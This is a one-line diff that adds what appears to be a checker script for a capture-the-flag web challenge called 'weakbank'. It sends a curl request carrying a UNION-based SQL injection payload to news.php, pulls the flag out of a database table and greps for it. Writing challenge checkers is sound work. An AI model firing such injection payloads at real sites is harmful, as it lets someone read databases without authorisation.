@@ -1,0 +1,1 @@
+curl --fail -s --resolve 'weakbank.webctf.it:443:172.17.0.1' "https://weakbank.webctf.it/main/news.php?news=0%20union%20select%201,flag,3,4%20from%20flag;--+" | grep -q "$FLAG"
